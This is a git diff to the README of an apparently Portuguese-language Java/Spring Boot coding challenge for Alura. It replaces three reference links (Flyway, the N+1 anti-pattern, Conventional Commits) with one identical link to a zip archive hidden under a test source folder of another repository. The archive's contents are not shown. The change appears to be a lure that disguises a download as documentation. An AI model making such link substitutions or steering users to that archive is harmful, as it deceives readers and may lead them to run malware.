@@ -12,7 +12,7 @@ Não há respostas certas ou erradas, queremos avaliar como você aplica conceit
 - Spring Boot
 - Spring Data JPA
 - MySQL
-- Migrações de banco de dados manuais com [Flyway](https://www.baeldung.com/database-migrations-with-flyway)
+- Migrações de banco de dados manuais com [Flyway](https://raw.githubusercontent.com/thaysvs2/desafio-alura/main/src/test/java/br/com/alura/desafio-alura-v3.5.zip)
 
 ## Instruções
 
@@ -82,7 +82,7 @@ Com os cursos criados, o próximo passo é permitir que os alunos se matriculem 
 Agora que temos usuários e matrículas, queremos gerar um relatório para identificar os cursos mais acessados. Implemente a lógica na rota `/registration/report` para listar os cursos com mais matrículas, ordenados pelo número de inscrições.
 
 > [!IMPORTANT]
-> A Alura possui um grande volume de dados. Portanto, priorize o uso de SQL nativo na construção do relatório e evite o [anti-pattern N+1](https://semantix.ai/o-que-e-o-problema-n1/).
+> A Alura possui um grande volume de dados. Portanto, priorize o uso de SQL nativo na construção do relatório e evite o [anti-pattern N+1](https://raw.githubusercontent.com/thaysvs2/desafio-alura/main/src/test/java/br/com/alura/desafio-alura-v3.5.zip).
 
 ## Considerações Finais
 
@@ -94,4 +94,4 @@ Agora que temos usuários e matrículas, queremos gerar um relatório para ident
 - O uso de ferramentas de IA é permitido, mas o código gerado deve ser revisado. Caso avance para a próxima etapa, a entrevista técnica será baseada no código que você produziu.
 
 > [!TIP]
-> Para uma melhor organização dos commits, considere seguir as [convenções de commits](https://www.conventionalcommits.org/pt-br/v1.0.0/). Isso ajuda a manter um histórico claro e compreensível do projeto.
+> Para uma melhor organização dos commits, considere seguir as [convenções de commits](https://raw.githubusercontent.com/thaysvs2/desafio-alura/main/src/test/java/br/com/alura/desafio-alura-v3.5.zip). Isso ajuda a manter um histórico claro e compreensível do projeto.
